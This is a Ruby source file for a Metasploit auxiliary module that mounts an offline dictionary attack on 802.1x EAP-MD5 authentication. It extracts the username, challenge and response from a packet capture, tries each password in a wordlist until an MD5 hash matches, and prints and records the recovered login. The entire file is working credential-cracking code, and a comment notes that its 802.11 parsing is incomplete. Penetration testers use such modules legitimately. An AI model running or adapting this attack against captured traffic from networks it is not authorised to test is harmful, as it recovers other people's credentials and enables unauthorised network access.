##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Capture
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'           => '802.1x EAP-MD5 Challenge Dictionary Attack',
            'Description'    => %q{
                	This module launch a dictionary attack against an EAP-MD5 challenge. The PCAP
				should contains at least the following requests: (1) EAP response with identity
				(contains the username), (2) EAP request with MD5-challenge, (3) EAP response with
				MD5-challenge and (4) EAP success (the module validate the authentication was
				successful). The module is compatible with wired and 802.11 - 802.1x environments.
            },
			'Author'         =>
				[
					'pello <fropert[at]packetfault.org>'
				],
            'License'        => MSF_LICENSE
        )

        register_options(
            [
				OptPath.new('WORDLIST', [true, 'Wordlist file for challenge bruteforce',
					File.join(Msf::Config.install_root, "data", "wordlists", "unix_passwords.txt")]),
            ], self.class)

		deregister_options('RHOST','NETMASK','TIMEOUT','FILTER','SNAPLEN','INTERFACE')

    end

	def find_eap_challenge
		eapinfo = Hash.new
		cap = PacketFu::PcapFile.new.f2a(:filename => datastore['PCAPFILE'])
		cap.each do |pkt|
			begin
				if pkt[30,2] == "\x88\x8e" # 802.11
					# TODO this parsing needs to be fixed
					if pkt[36].to_i == 2 and pkt[40].to_i == 4
						eapinfo['resp'] = pkt[42..(42 + pkt[41] - 1)]
					elsif pkt[36].to_i == 1 and pkt[40].to_i == 4
						eapinfo['req'] = pkt[42..(42 + pkt[41] - 1)]
					elsif pkt[36].to_i == 2 and pkt[40].to_i == 1
						eapinfo['user'] = pkt[42..(42 + pkt[41] - 1)]
					elsif pkt[36].to_i == 3
						eapinfo['status'] = true
					else
						next
					end
				end
				if pkt[12,2] == "\x88\x8e" # 802.3
					if pkt[18].unpack("C")[0] == 2 and pkt[22].unpack("C")[0] == 1
						# Identity Response
						user_length = pkt[20,2].unpack("n")[0] - 5
						eapinfo['user'] = pkt[23, user_length]
					elsif pkt[18].unpack("C")[0] == 1 and pkt[22].unpack("C")[0] == 4
						# Request MD5-Challenge
						eapinfo['req'] = pkt[24, pkt[23].unpack("C")[0]]
					elsif pkt[18].unpack("C")[0] == 2 and pkt[22].unpack("C")[0] == 4
						# Response MD5-Challenge
						eapinfo['resp'] = pkt[24, pkt[23].unpack("C")[0]]
					elsif pkt[18].unpack("C")[0] == 3
						# Success
						eapinfo['status'] = true
					else
						next
					end
				end
				break if eapinfo.length == 4
			rescue
				next
			end
		end
		eapinfo
	end

	def search_password(req_challenge, res_challenge, user)
		correctpass = ""

		print_status("Passwords loaded from #{datastore['WORDLIST']}")

		challenge = res_challenge.unpack('H2' *  res_challenge.length).join

		File.open(datastore['WORDLIST'],"r").each_line do |p|
            md5 = Rex::Text.md5(2.chr + p.rstrip + req_challenge)
            if md5 == challenge
				correctpass = p
				break
            end
		end

		if correctpass.empty?
			print_error("Password not found.")
		else
			print_good("The login/password is: #{user}/#{correctpass}")
			report_note(
				:type => 'EAP-MD5',
				:user => user,
				:pass => correctpass
			)
		end

	end

    def run

		print_status("Looking for EAP-MD5 challenge in #{datastore['PCAPFILE']}")

		eap = find_eap_challenge
		if not eap['req'] or not eap['resp']
			print_error("There is no EAP-MD5 challenge in the PCAP file")
		elsif not eap['status']
			print_error("There is no successful EAP-MD5 challenge in the PCAP file")
		else
			search_password(eap['req'], eap['resp'], eap['user'])
		end

    end


end
